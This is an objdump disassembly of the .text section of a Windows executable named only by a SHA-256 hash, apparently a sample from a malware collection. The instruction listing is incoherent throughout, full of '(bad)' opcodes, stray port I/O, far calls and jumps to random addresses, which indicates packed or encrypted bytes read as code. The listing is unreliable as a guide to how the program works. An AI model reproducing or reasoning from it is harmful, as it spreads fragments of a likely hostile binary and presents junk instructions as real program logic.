
9e17b8d7d129d95aae9391ac434c63e1879c55a08a61f5cc8811906dde8ee836.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	cdq    
  411001:	push   esp
  411002:	mov    al,0xdf
  411004:	dec    edx
  411005:	daa    
  411006:	xor    eax,0x567ad212
  41100b:	sbb    BYTE PTR es:[ecx],bl
  41100e:	sub    al,0xee
  411010:	loopne 0x411009
  411012:	pusha  
  411013:	pushf  
  411014:	dec    eax
  411015:	loopne 0x41103f
  411017:	pop    es
  411018:	lahf   
  411019:	sub    ebp,DWORD PTR [esi+0x6c]
  41101c:	mov    al,ds:0x7ad22229
  411021:	add    al,0x31
  411023:	test   BYTE PTR [ebp-0x51d85f51],dh
  411029:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41102b:	xchg   ebx,eax
  41102c:	mov    ah,0x1d
  41102e:	xor    eax,0xd8b8ddf6
  411033:	in     al,dx
  411034:	xchg   esp,eax
  411035:	push   ebp
  411036:	cwde   
  411037:	jp     0x4110b3
  411039:	(bad)  
  41103a:	lods   al,BYTE PTR ds:[esi]
  41103b:	mov    ecx,0xf5172cab
  411040:	aad    0xa7
  411042:	cmp    DWORD PTR [ebp+edi*4-0x147ba575],eax
  411049:	adc    esp,DWORD PTR [ebp+ecx*8-0x5abf72ff]
  411050:	ins    DWORD PTR es:[edi],dx
  411051:	jae    0x410fd5
  411053:	mov    edi,0x6e86f0e7
  411058:	pushf  
  411059:	sbb    ah,dl
  41105b:	push   0x56
  41105d:	addr16 jmp 0x99cf9e15
  411063:	in     al,0x4a
  411065:	adc    bl,BYTE PTR [ebx-0x15a01cf1]
  41106b:	loopne 0x411051
  41106d:	shl    BYTE PTR [ecx+0x20],1
  411070:	jae    0x41105a
  411072:	neg    DWORD PTR [eax+0x390a7ae8]
  411078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411079:	cmp    edi,edi
  41107b:	loope  0x4110d8
  41107d:	cmp    esp,DWORD PTR [ebp+ecx*8-0x44ae3c6]
  411084:	push   ebp
  411085:	retf   0xf98a
  411088:	mov    BYTE PTR [esi-0x65],0x4
  41108c:	(bad)
  41108f:	lods   al,BYTE PTR ds:[esi]
  411090:	and    dl,BYTE PTR [ebx+edi*4+0x5825a0e5]
  411097:	adc    edi,eax
  411099:	mov    ebp,edx
  41109b:	mov    dh,0xcf
  41109d:	fidivr WORD PTR [ecx]
  41109f:	js     0x4110ca
  4110a1:	daa    
  4110a2:	sub    DWORD PTR [ecx-0x3b031bfb],ecx
  4110a8:	jnp    0x41108f
  4110aa:	xchg   ebx,eax
  4110ab:	mov    ?,ecx
  4110ad:	xchg   ebx,eax
  4110ae:	fs inc ebp
  4110b0:	aam    0x7e
  4110b2:	mov    esi,0x452b8f70
  4110b7:	je     0x4110cd
  4110b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110ba:	nop
  4110bb:	call   0x18a3cd0c
  4110c0:	in     eax,0x70
  4110c2:	(bad)  
  4110c3:	or     ebx,DWORD PTR [ebp+0x4dce075e]
  4110c9:	es out 0x26,eax
  4110cc:	fisubr WORD PTR [ebx-0x2e]
  4110cf:	mov    ebp,0xdd9c6ea0
  4110d4:	or     eax,0x4253a397
  4110d9:	pop    ss
  4110da:	pop    ebx
  4110db:	es mov dh,dh
  4110de:	out    dx,al
  4110df:	and    bl,dl
  4110e1:	int    0xde
  4110e3:	or     al,0xc5
  4110e5:	das    
  4110e6:	idiv   bh
  4110e8:	test   al,0xef
  4110ea:	dec    ecx
  4110eb:	iret   
  4110ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110ed:	mov    bl,0x6f
  4110ef:	ss dec ecx
  4110f1:	sbb    ebx,esi
  4110f3:	shr    edx,0xe2
  4110f6:	out    dx,al
  4110f7:	imul   eax,DWORD PTR [ebx-0x73c63ae1],0x431b6552
  411101:	or     al,0x46
  411103:	mul    BYTE PTR [edi+0x23340621]
  411109:	popa   
  41110a:	xor    esp,ebx
  41110c:	push   cs
  41110d:	out    dx,al
  41110e:	test   BYTE PTR [ebx],ah
  411110:	inc    ecx
  411111:	popf   
  411112:	int3   
  411113:	(bad)  
  411114:	xchg   edi,eax
  411115:	rol    BYTE PTR [ecx-0x46],0x7
  411119:	dec    ebx
  41111a:	xor    ecx,0x53c88e5c
  411120:	es popa 
  411122:	and    al,dl
  411124:	mov    al,0xc5
  411126:	mov    ?,WORD PTR [edx]
  411128:	ja     0x411100
  41112a:	nop
  41112b:	test   eax,0xb16a3b27
  411130:	adc    ch,0xfd
  411133:	adc    DWORD PTR [ebp-0x4a],ebx
  411136:	cld    
  411137:	es sbb ch,dl
  41113a:	push   esp
  41113b:	mov    cl,0x9b
  41113d:	sbb    edx,DWORD PTR [ebx]
  41113f:	les    ecx,FWORD PTR [ebx]
  411141:	jmp    0x4110d8
  411143:	dec    esi
  411144:	xor    eax,0xe98848a2
  411149:	mov    esp,DWORD PTR ds:0x823f667c
  41114f:	and    ah,BYTE PTR [eax-0x16]
  411152:	inc    edi
  411153:	out    dx,al
  411154:	pop    ds
  411155:	dec    edx
  411156:	rol    DWORD PTR [ebx],cl
  411158:	test   eax,0x9f7ce78a
  41115d:	rcl    ah,1
  41115f:	cld    
  411160:	and    ebp,DWORD PTR [eax+0x7]
  411163:	pop    ss
  411164:	pop    ss
  411165:	jle    0x4110f5
  411167:	and    eax,0x2f8da6fb
  41116c:	ins    BYTE PTR es:[edi],dx
  41116d:	sub    ah,BYTE PTR ds:0x3bc0d441
  411173:	xor    DWORD PTR [ecx+0x122e2875],esi
  411179:	lds    eax,FWORD PTR [ebx+0xa5df6b6]
  41117f:	mov    ah,0x80
  411181:	es cmp al,0x1c
  411184:	in     al,dx
  411185:	popf   
  411186:	fwait
  411187:	daa    
  411188:	(bad)  
  411189:	stc    
  41118a:	cwde   
  41118b:	shl    DWORD PTR [ebx],0xa5
  41118e:	ins    DWORD PTR es:[edi],dx
  41118f:	xchg   esp,eax
  411190:	mov    ebx,0x33bb9960
  411195:	ins    BYTE PTR es:[edi],dx
  411196:	inc    eax
  411197:	add    BYTE PTR [edi+0x3a],0x7d
  41119b:	xchg   ebx,eax
  41119c:	enter  0x9278,0xe9
  4111a0:	not    DWORD PTR [ebp+eax*4+0x38ea028c]
  4111a7:	imul   DWORD PTR [ebp-0x46]
  4111aa:	call   0x4c9a:0xc4bece29
  4111b1:	xor    edx,DWORD PTR [ebx]
  4111b3:	pop    edi
  4111b4:	mov    edi,0xc5e213cc
  4111b9:	jg     0x411236
  4111bb:	mov    eax,0xf97233b2
  4111c0:	cmp    ebx,eax
  4111c2:	icebp  
  4111c3:	xchg   BYTE PTR [ecx],al
  4111c5:	xchg   DWORD PTR [ebx-0x3b],ebx
  4111c8:	lods   al,BYTE PTR ds:[esi]
  4111c9:	std    
  4111ca:	push   esp
  4111cb:	pinsrw mm7,WORD PTR [eax+ecx*2+0x169606e5],0x14
  4111d4:	sahf   
  4111d5:	push   0xcd5277b3
  4111da:	fsubr  st,st(7)
  4111dc:	pop    esi
  4111dd:	call   0x6a20518c
  4111e2:	bound  edi,QWORD PTR [eax]
  4111e4:	cmp    edi,DWORD PTR [esi+0x7aa7918b]
  4111ea:	or     DWORD PTR [ebp+ebx*2-0x1],esp
  4111ee:	push   ecx
  4111ef:	mov    esi,0x4389d87f
  4111f4:	jmp    0x4111d4
  4111f6:	and    DWORD PTR [eax+0x2e66b2ad],esp
  4111fc:	pop    eax
  4111fd:	outs   dx,DWORD PTR ds:[esi]
  4111fe:	ret    0xa782
  411201:	push   eax
  411202:	aad    0xf5
  411204:	inc    ecx
  411205:	sbb    bl,BYTE PTR [edi]
  411207:	fiadd  WORD PTR [ecx+0x3b]
  41120a:	mov    edx,0x9316a87
  41120f:	dec    edi
  411210:	jle    0x4111ad
  411212:	jno    0x411285
  411214:	sub    ecx,DWORD PTR [ebp-0x38d9e279]
  41121a:	and    BYTE PTR [ecx],bl
  41121c:	mov    eax,0x3efa4516
  411221:	or     BYTE PTR [edx+0x1adf45fb],cl
  411227:	test   ax,0x51b4
  41122b:	out    0xec,al
  41122d:	std    
  41122e:	add    esi,DWORD PTR [ecx]
  411230:	mov    edx,0x7351b9d9
  411235:	mov    cl,0xf3
  411237:	outs   dx,DWORD PTR ds:[esi]
  411238:	push   edx
  411239:	xchg   esi,eax
  41123a:	dec    edx
  41123b:	cwde   
  41123c:	repnz loope 0x41121c
  41123f:	mov    ds:0x2af34823,eax
  411244:	push   ss
  411245:	aaa    
  411246:	jecxz  0x411270
  411248:	les    eax,FWORD PTR [esi-0x4]
  41124b:	jle    0x411263
  41124d:	pop    ecx
  41124e:	out    dx,eax
  41124f:	sar    DWORD PTR [ecx-0x35ad9f63],0x20
  411256:	dec    esi
  411257:	int3   
  411258:	xchg   esp,eax
  411259:	mov    bh,0x3b
  41125b:	pop    eax
  41125c:	push   esi
  41125d:	adc    BYTE PTR [edi-0x45471f3c],dl
  411263:	(bad)  
  411264:	jae    0x411220
  411266:	adc    dh,BYTE PTR es:[edx+0x5d2e6df]
  41126d:	sub    eax,0xfee458b3
  411272:	jbe    0x4111fe
  411274:	pop    ss
  411275:	inc    esi
  411276:	sahf   
  411277:	mov    BYTE PTR [esi-0x46e721fb],dh
  41127d:	and    bl,BYTE PTR [ecx-0x75]
  411280:	add    BYTE PTR [edi+0xb],ch
  411283:	aas    
  411284:	pop    es
  411285:	jge    0x4112b4
  411287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411288:	test   DWORD PTR [ebx],edx
  41128a:	bnd je 0x411300
  41128d:	fwait
  41128e:	push   ebx
  41128f:	test   al,0x9d
  411291:	mov    dl,0xe
  411293:	stc    
  411294:	stc    
  411295:	daa    
  411296:	test   BYTE PTR [ebx+0x3cd2e6ee],ah
  41129c:	scas   al,BYTE PTR es:[edi]
  41129d:	sub    BYTE PTR [ecx+ebp*4-0x76],cl
  4112a1:	call   0xf90e:0x25b19f7
  4112a8:	lods   eax,DWORD PTR ds:[esi]
  4112a9:	rcr    DWORD PTR [ebx+edx*2+0x68eeb20c],1
  4112b0:	pop    ecx
  4112b1:	mov    ebx,0xea01d53e
  4112b6:	or     BYTE PTR [ecx+0x25],ah
  4112b9:	add    ebx,DWORD PTR [edx+0x61]
  4112bc:	shl    DWORD PTR [edx-0x63650668],1
  4112c2:	retf   
  4112c3:	aam    0xe3
  4112c5:	and    ecx,edi
  4112c7:	adc    al,bh
  4112c9:	dec    edi
  4112ca:	icebp  
  4112cb:	scas   eax,DWORD PTR es:[edi]
  4112cc:	sub    DWORD PTR es:[eax+0x38],edx
  4112d0:	pop    esp
  4112d1:	push   ds
  4112d2:	loopne 0x411302
  4112d4:	das    
  4112d5:	xchg   ebp,eax
  4112d6:	mov    bl,0xe1
  4112d8:	dec    edx
  4112d9:	push   ss
  4112da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112db:	or     al,0x3
  4112dd:	pop    eax
  4112de:	adc    ah,BYTE PTR [esi+eiz*8+0x77f906dd]
  4112e5:	popf   
  4112e6:	inc    esi
  4112e7:	mov    cl,0x32
  4112e9:	jp     0x4112c9
  4112eb:	call   0xe818b730
  4112f0:	adc    BYTE PTR [ebx+0x4ff5fd8f],cl
  4112f6:	and    al,0xc8
  4112f8:	inc    esp
  4112f9:	arpl   WORD PTR [ecx],bx
  4112fb:	xlat   BYTE PTR ds:[ebx]
  4112fc:	pop    esp
  4112fd:	push   edx
  4112fe:	xor    edi,0x72226a9f
  411304:	ins    DWORD PTR es:[edi],dx
  411305:	xor    edi,eax
  411307:	xchg   edi,eax
  411308:	dec    ebx
  411309:	nop
  41130a:	clc    
  41130b:	sbb    BYTE PTR [edx+0x26adbe4d],al
  411311:	(bad)  
  411312:	cmc    
  411313:	rcr    BYTE PTR [eax+0x24b2c73c],cl
  411319:	(bad)  
  41131a:	daa    
  41131b:	adc    ebx,DWORD PTR [ecx+0x735c0f5f]
  411321:	or     eax,0x2b3e7a56
  411326:	fwait
  411327:	in     al,0xdc
  411329:	or     dl,BYTE PTR [edx-0x4c]
  41132c:	sub    ecx,DWORD PTR [eax+0x1a0262fa]
  411332:	aad    0x3a
  411334:	sar    DWORD PTR [ebx+0x65],cl
  411337:	test   eax,0xc2fc1488
  41133c:	mov    esp,0x1f3f2b8
  411341:	dec    edi
  411342:	jbe    0x4112ed
  411344:	ret    0x911d
  411347:	test   DWORD PTR [ecx+eax*2+0x60],ecx
  41134b:	int3   
  41134c:	sbb    BYTE PTR [edi-0x74],dh
  41134f:	das    
  411350:	jg     0x411327
  411352:	lods   eax,DWORD PTR ds:[esi]
  411353:	cmc    
  411354:	xchg   DWORD PTR [eax+0xafe1ec9],edi
  41135a:	dec    edi
  41135b:	push   ss
  41135c:	xor    eax,0x41c1231e
  411361:	adc    bl,BYTE PTR ds:0x4f01b2ec
  411367:	jb     0x411387
  411369:	jle    0x41134f
  41136b:	mov    edi,0x517fff12
  411370:	xlat   BYTE PTR ds:[ebx]
  411371:	mov    ?,WORD PTR [ecx-0x4bad5596]
  411377:	mov    ebx,0x5f75e155
  41137c:	mov    ebx,0xb23fa02c
  411381:	stos   BYTE PTR es:[edi],al
  411382:	xchg   ebx,eax
  411383:	cs push esi
  411385:	pop    ecx
  411386:	or     al,0x62
  411388:	out    dx,eax
  411389:	adc    ebx,DWORD PTR [ebx+0x138d8b99]
  41138f:	push   es
  411390:	cwde   
  411391:	test   DWORD PTR [ebx-0x16381afe],ebp
  411397:	pop    ebp
  411398:	push   edx
  411399:	xchg   edi,eax
  41139a:	mov    dh,0xcc
  41139c:	adc    DWORD PTR [edi+ebx*8-0x27a1168c],0x8be69349
  4113a7:	inc    eax
  4113a8:	fisttp WORD PTR [ebx-0x2893a391]
  4113ae:	mov    esp,0x8d659610
  4113b3:	mov    edi,0x279e1390
  4113b8:	std    
  4113b9:	cld    
  4113ba:	mov    esp,0x853f4bc4
  4113bf:	mov    al,BYTE PTR [esi]
  4113c1:	push   cs
  4113c2:	adc    ch,BYTE PTR [edx-0x7b]
  4113c5:	pop    ebx
  4113c6:	fstp   TBYTE PTR [ebp+0x3be2c272]
  4113cc:	mov    DWORD PTR [esi+ebp*8+0x3d],ecx
  4113d0:	jp     0x41138d
  4113d2:	(bad)  [esi-0x27]
  4113d5:	jne    0x4113a8
  4113d7:	dec    eax
  4113d8:	jmp    0xf952d546
  4113dd:	adc    al,BYTE PTR [edx-0x4cf8b071]
  4113e3:	arpl   sp,sp
  4113e5:	dec    edi
  4113e6:	xchg   edx,eax
  4113e7:	repnz icebp 
  4113e9:	sar    DWORD PTR [esi+0x71],1
  4113ec:	xchg   ecx,eax
  4113ed:	call   0xfeb9f830
  4113f2:	imul   ecx,DWORD PTR [edi+ebx*8+0x2c],0x1a03bb00
  4113fa:	jmp    0xd040:0xc41f0a24
  411401:	cdq    
  411402:	out    dx,al
  411403:	or     DWORD PTR [esp+ebx*1-0x68931726],esp
  41140a:	clc    
  41140b:	cmp    eax,0x63608c94
  411410:	mov    ah,0x51
  411412:	pop    ebp
  411413:	push   ds
  411414:	jne    0x411402
  411416:	pop    ecx
  411417:	test   cl,ah
  411419:	xchg   ebp,eax
  41141a:	mov    ebp,0x7cf15951
  41141f:	daa    
  411420:	mov    ch,0x3f
  411422:	dec    esp
  411423:	aad    0x41
  411425:	iret   
  411426:	stos   DWORD PTR es:[edi],eax
  411427:	fmul   QWORD PTR [edi+esi*4-0x77]
  41142b:	mov    ah,0xf
  41142d:	sub    bh,dh
  41142f:	add    bh,cl
  411431:	out    0xd1,eax
  411433:	cmp    DWORD PTR [eax-0x7a4f1d68],esp
  411439:	add    al,0xdf
  41143b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41143c:	inc    ecx
  41143d:	hlt    
  41143e:	shl    DWORD PTR [ecx*1-0x2c5da6e8],1
  411445:	jle    0x4114a1
  411447:	adc    esi,DWORD PTR [esi+0x3dd1ad59]
  41144d:	jp     0x41147e
  41144f:	pop    esp
  411450:	scas   al,BYTE PTR es:[edi]
  411451:	adc    al,0xa0
  411453:	je     0x41141b
  411455:	inc    esp
  411456:	clc    
  411457:	jne    0x411485
  411459:	sub    BYTE PTR [eax+0x77],bh
  41145c:	mov    eax,0x907c3860
  411461:	imul   edi,ebx,0x48
  411464:	retf   
  411465:	xor    al,0xf5
  411467:	nop
  411468:	aas    
  411469:	sbb    BYTE PTR [ebx+0x101d213],cl
  41146f:	dec    edi
  411470:	ret    
  411471:	or     dh,BYTE PTR [eax-0x49]
  411474:	ret    0x3eb9
  411477:	fcomp  QWORD PTR [esp+ebp*1+0x2c]
  41147b:	inc    edx
  41147c:	pop    ds
  41147d:	popa   
  41147e:	call   0xebc9497b
  411483:	ss sbb al,0x1b
  411486:	mov    ?,WORD PTR [ebx]
  411488:	sbb    ecx,DWORD PTR [ebp+0x1cc81724]
  41148e:	inc    ecx
  41148f:	or     DWORD PTR [eax-0x2a],edx
  411492:	leave  
  411493:	out    0xab,eax
  411495:	inc    ebp
  411496:	jmp    0x4114b7
  411498:	push   ecx
  411499:	(bad)  
  41149b:	push   ebp
  41149c:	sub    BYTE PTR [edi],dh
  41149e:	push   edi
  41149f:	jecxz  0x411451
  4114a1:	jnp    0x411509
  4114a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114a4:	test   DWORD PTR [ebp+0x9e12b28],esp
  4114aa:	(bad)  
  4114ab:	dec    esi
  4114ac:	dec    ebx
  4114ad:	mov    ebp,0x6bccc394
  4114b2:	sub    eax,0x4b783613
  4114b7:	shl    BYTE PTR [eax],cl
  4114b9:	adc    ch,BYTE PTR [edx+edi*4-0x78ed194a]
  4114c0:	dec    ebx
  4114c1:	ror    BYTE PTR [edi],0xc7
  4114c4:	and    al,0x64
  4114c6:	xchg   esp,eax
  4114c7:	test   eax,0xc1e44399
  4114cc:	pop    ecx
  4114cd:	fcom   DWORD PTR [ebx-0x13]
  4114d0:	mov    eax,0xa9cdda33
  4114d5:	mov    ch,0xf8
  4114d7:	fst    QWORD PTR [edx-0x5f66aee6]
  4114dd:	fwait
  4114de:	dec    eax
  4114df:	iret   
  4114e0:	nop
  4114e1:	ins    BYTE PTR es:[edi],dx
  4114e2:	push   esp
  4114e3:	fdivr  st(1),st
  4114e5:	push   cs
  4114e6:	add    eax,0x7d218cb7
  4114eb:	lock add DWORD PTR [ecx+0x24],ebp
  4114ef:	jp     0x411553
  4114f1:	xor    DWORD PTR [ecx],ecx
  4114f3:	lds    edx,FWORD PTR ds:0x73236150
  4114f9:	xchg   esp,eax
  4114fa:	(bad)  
  4114fb:	mov    ebp,0x3dde1b0b
  411500:	add    al,0x3a
  411502:	xor    BYTE PTR [esi-0x6dd974be],ah
  411508:	xchg   BYTE PTR [edi+edx*4-0x75efa67a],al
  41150f:	cld    
  411510:	ret    0x5364
  411513:	push   edx
  411514:	mov    eax,0x636e1741
  411519:	push   eax
  41151a:	mov    ds:0x156b4600,eax
  41151f:	retf   
  411520:	jbe    0x41155f
  411522:	test   cl,al
  411524:	jmp    0xa385:0xb7855e1b
  41152b:	jmp    0x236b:0x9323db6e
  411532:	sub    eax,0xd83facf2
  411537:	enter  0x7d75,0x86
  41153b:	das    
  41153c:	call   0xe423:0xa93daea5
  411543:	test   al,0x6
  411545:	in     al,dx
  411546:	push   ecx
  411547:	mov    al,0xd9
  411549:	(bad)  
  41154a:	adc    BYTE PTR [bx+si+0x3d],ch
  41154e:	cmp    al,0x9a
  411550:	xbegin 0xfd09ca29
  411556:	mov    eax,0xa312aa70
  41155b:	dec    esp
  41155c:	call   0x7a79bcb4
  411561:	js     0x411596
  411563:	or     ecx,DWORD PTR [ebx]
  411565:	sahf   
  411566:	mov    edx,0xa27f0470
  41156b:	call   0xa6a8:0x2b7e26b5
  411572:	xchg   BYTE PTR [ecx],dl
  411574:	mov    ah,0xcc
  411576:	bound  esi,QWORD PTR [ebx-0x5a]
  411579:	inc    ebp
  41157a:	xor    dh,bh
  41157c:	push   0x6500370b
  411581:	(bad)  
  411582:	cmc    
  411583:	loopne 0x411526
  411585:	loope  0x4115dc
  411587:	ins    BYTE PTR es:[edi],dx
  411588:	fstp   QWORD PTR [edx]
  41158a:	mul    ebp
  41158c:	lahf   
  41158d:	or     al,0x69
  41158f:	or     ch,BYTE PTR [eax-0x73]
  411592:	arpl   WORD PTR [edx+0x118ae1f5],ax
  411598:	retf   
  411599:	sub    ecx,DWORD PTR ds:0xa3a29ff9
  41159f:	jg     0x4115cf
  4115a1:	pop    es
  4115a2:	mov    al,ds:0x7871abe3
  4115a7:	adc    edi,DWORD PTR [edx]
  4115a9:	mov    esp,0x8116d543
  4115ae:	and    al,0x90
  4115b0:	xor    al,0xbb
  4115b2:	scas   eax,DWORD PTR es:[edi]
  4115b3:	sti    
  4115b4:	jg     0x41156b
  4115b6:	pop    esi
  4115b7:	xor    bl,BYTE PTR [eax-0x7b4724df]
  4115bd:	js     0x4115d5
  4115bf:	mov    ebx,DWORD PTR [ebp+0x3d]
  4115c2:	sbb    cl,BYTE PTR [eax+0x60169d45]
  4115c8:	or     BYTE PTR [ebp-0x4a584874],cl
  4115ce:	out    dx,eax
  4115cf:	xchg   ecx,eax
  4115d0:	jae    0x41160f
  4115d2:	sbb    DWORD PTR gs:[edi-0x32],ebx
  4115d6:	pusha  
  4115d7:	add    DWORD PTR [edx-0x71af20cb],ecx
  4115dd:	hlt    
  4115de:	cmp    BYTE PTR [ebx],dl
  4115e0:	adc    DWORD PTR [esi-0x5ee656fe],ebp
  4115e6:	mov    ch,0x3b
  4115e8:	sahf   
  4115e9:	pushf  
  4115ea:	shl    ebx,cl
  4115ec:	jmp    0x73bd7001
  4115f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115f2:	mov    bl,0x4e
  4115f4:	mov    ah,0x19
  4115f6:	shl    BYTE PTR [esi],0x59
  4115f9:	(bad)  
  4115fa:	xlat   BYTE PTR ds:[ebx]
  4115fb:	clc    
  4115fc:	icebp  
  4115fd:	popf   
  4115fe:	retf   0xa2f6
  411601:	clc    
  411602:	psraw  mm2,QWORD PTR [edi-0x2]
  411606:	retf   0xfeff
  411609:	js     0x41165d
  41160b:	test   BYTE PTR [esi+0x24a41da0],cl
  411611:	xchg   esp,eax
  411612:	mov    eax,0x100d4000
  411617:	xor    dl,BYTE PTR [esi-0x67e793d4]
  41161d:	lahf   
  41161e:	lods   eax,DWORD PTR ds:[esi]
  41161f:	ret    
  411620:	call   0xc8bd212b
  411625:	in     eax,0xff
  411627:	cli    
  411628:	or     al,0xf3
  41162a:	xchg   ebp,eax
  41162b:	push   eax
  41162c:	ins    BYTE PTR es:[edi],dx
  41162d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41162e:	aam    0xa7
  411630:	ret    0xada3
  411633:	mov    eax,0x501b7f07
  411638:	dec    ebp
  411639:	dec    eax
  41163a:	and    DWORD PTR [edi-0x57],eax
  41163d:	(bad)  
  41163e:	ret    0x9cdc
  411641:	mov    cl,0xb0
  411643:	sbb    edx,DWORD PTR [eax]
  411645:	fnstcw WORD PTR [ebx]
  411647:	and    esi,esp
  411649:	aaa    
  41164a:	dec    edx
  41164b:	ds nop
  41164d:	or     dh,0x18
  411650:	jno    0x411662
  411652:	inc    ebp
  411653:	push   ss
  411654:	xor    al,BYTE PTR ds:0x93cc9f57
  41165a:	mov    esp,0x40bf9e66
  41165f:	sti    
  411660:	les    esp,FWORD PTR [eax+0x7992d2bd]
  411666:	test   DWORD PTR [eax+0x44],edx
  411669:	arpl   WORD PTR ss:[ebp+0x7e],ax
  41166d:	cmc    
  41166e:	mov    al,ds:0xd655237e
  411673:	dec    edi
  411674:	mov    esp,ecx
  411676:	inc    ebx
  411677:	adc    ebx,DWORD PTR [esi+0x29]
  41167a:	ins    DWORD PTR es:[edi],dx
  41167b:	add    edx,DWORD PTR [ebp+0x12]
  41167e:	clc    
  41167f:	(bad)  
  411681:	leave  
  411682:	test   eax,0x7f27b886
  411687:	push   ss
  411688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411689:	mov    ch,0xf6
  41168b:	mov    ds:0x3b5060c6,al
  411690:	ror    BYTE PTR [eax+esi*8],1
  411693:	retf   
  411694:	jge    0x4116a7
  411696:	retf   
  411697:	aad    0x98
  411699:	lods   eax,DWORD PTR ds:[esi]
  41169a:	es scas al,BYTE PTR es:[edi]
  41169c:	and    BYTE PTR [eax+0x5a],0xa1
  4116a0:	sbb    ebp,DWORD PTR [esi+eax*1+0x11]
  4116a4:	xor    al,0x9b
  4116a6:	or     edi,DWORD PTR ds:0xe172fd4
  4116ac:	dec    esp
  4116ad:	(bad)  
  4116ae:	test   eax,0xe92c2b84
  4116b3:	and    ah,BYTE PTR [eax+0x2066e9e1]
  4116b9:	pusha  
  4116ba:	xchg   BYTE PTR [edx-0x18],bl
  4116bd:	cmp    eax,0x74a2e9b8
  4116c2:	mov    edx,0x90e1230b
  4116c7:	dec    edx
  4116c8:	mov    edi,0xa2743355
  4116cd:	mov    al,0xc2
  4116cf:	leave  
  4116d0:	nop
  4116d1:	loop   0x411701
  4116d3:	fild   QWORD PTR [ecx+0x8]
  4116d6:	mov    esp,0x11d76712
  4116db:	mov    al,0xf8
  4116dd:	cmc    
  4116de:	mov    bl,0xb2
  4116e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116e1:	cdq    
  4116e2:	ds jge 0x4116d8
  4116e5:	ror    eax,cl
  4116e7:	add    DWORD PTR [eax-0x42],esp
  4116ea:	in     eax,0x56
  4116ec:	push   ecx
  4116ed:	(bad)  
  4116ee:	pop    eax
  4116ef:	in     al,dx
  4116f0:	mov    ecx,0x73bef3e2
  4116f5:	sub    al,0x9c
  4116f7:	in     eax,dx
  4116f8:	daa    
  4116f9:	int3   
  4116fa:	mov    bl,0x9c
  4116fc:	mov    dh,0x2a
  4116fe:	std    
  4116ff:	push   ecx
  411700:	stos   DWORD PTR es:[edi],eax
  411701:	add    eax,0xa65108a8
  411706:	sub    esp,ecx
  411708:	stos   DWORD PTR es:[edi],eax
  411709:	cmp    ecx,DWORD PTR [edx+ebx*4+0x1364d5fd]
  411710:	xor    esp,DWORD PTR ds:0x28783d23
  411716:	repnz push edi
  411718:	in     al,0xc8
  41171a:	pop    ds
  41171b:	icebp  
  41171c:	loope  0x4116f7
  41171e:	adc    eax,0xf00319cc
  411723:	into   
  411724:	es dec ebp
  411726:	and    DWORD PTR [esp+ebx*4-0x24],0x743aaa9a
  41172e:	out    0xe6,al
  411730:	jecxz  0x411720
  411732:	push   ss
  411733:	psllq  mm4,QWORD PTR [ebp+0x68fe8deb]
  41173a:	ror    DWORD PTR [esi+0x59737b12],cl
  411740:	(bad)  
  411741:	out    dx,al
  411742:	mov    ecx,0x103f3fb8
  411747:	test   DWORD PTR [ebx+esi*8+0x22],esp
  41174b:	pop    ds
  41174c:	mov    edx,0x6f494766
  411751:	add    BYTE PTR [ebx+0x2cd8ec32],0xa1
  411758:	cmp    dh,BYTE PTR [esi+eiz*1]
  41175b:	cmp    ecx,DWORD PTR [esi]
  41175d:	add    esi,0xe6e309b7
  411763:	mov    eax,ds:0xf1e4cf44
  411768:	retf   0x39b
  41176b:	push   edx
  41176c:	sahf   
  41176d:	lea    ebx,[edx-0x4f]
  411770:	(bad)  
  411771:	fs imul edx,esi,0x79ffb8df
  411778:	lock jne 0x4117d4
  41177b:	(bad)  [ecx]
  41177d:	ins    DWORD PTR es:[edi],dx
  41177e:	lahf   
  41177f:	daa    
  411780:	and    eax,0xd07f6d55
  411785:	(bad)  
  411786:	or     DWORD PTR [edx],edi
  411788:	mov    edi,0x9f36c0fa
  41178d:	fwait
  41178e:	ss jg  0x4117f9
  411791:	mov    eax,0x8badabfb
  411796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411797:	push   cs
  411798:	inc    esp
  411799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41179a:	and    DWORD PTR [ebx-0x2a],esp
  41179d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41179e:	push   esp
  41179f:	or     edi,esi
  4117a1:	je     0x411736
  4117a3:	call   0x78ef7b7b
  4117a8:	inc    ebx
  4117a9:	mov    edx,0x92884785
  4117ae:	cwde   
  4117af:	push   0x4b5e16e9
  4117b4:	jne    0x4117d2
  4117b6:	in     al,0x1
  4117b8:	and    dl,ah
  4117ba:	lock es inc esp
  4117bd:	retf   0xdad9
  4117c0:	jg     0x411836
  4117c2:	test   BYTE PTR [eax+0x69],bh
  4117c5:	adc    al,0x15
  4117c7:	lods   al,BYTE PTR ds:[esi]
  4117c8:	sbb    al,0xb6
  4117ca:	dec    edx
  4117cb:	xor    BYTE PTR [esi-0x112c8430],bl
  4117d1:	ins    BYTE PTR es:[edi],dx
  4117d2:	es inc ebx
  4117d4:	xchg   edi,eax
  4117d5:	jecxz  0x4117c5
  4117d7:	dec    edx
  4117d8:	ds out dx,al
  4117da:	jb     0x4117d5
  4117dc:	xchg   ebx,eax
  4117dd:	sar    BYTE PTR [edi+eiz*2-0x13bdcd0f],cl
  4117e4:	mov    bl,0x29
  4117e6:	shl    BYTE PTR [edi],cl
  4117e8:	jp     0x411807
  4117ea:	inc    ebp
  4117eb:	push   0x7350fb7e
  4117f0:	shl    eax,0x1a
  4117f3:	cmp    esp,eax
  4117f5:	test   DWORD PTR [edx+0x600fbded],0x56bceb8d
  4117ff:	in     eax,dx
  411800:	adc    esp,DWORD PTR [esi+0x2eadeabb]
  411806:	and    BYTE PTR [ecx+0x3c],0x1b
  41180a:	sbb    edi,esp
  41180c:	pop    edx
  41180d:	fxch   st(5)
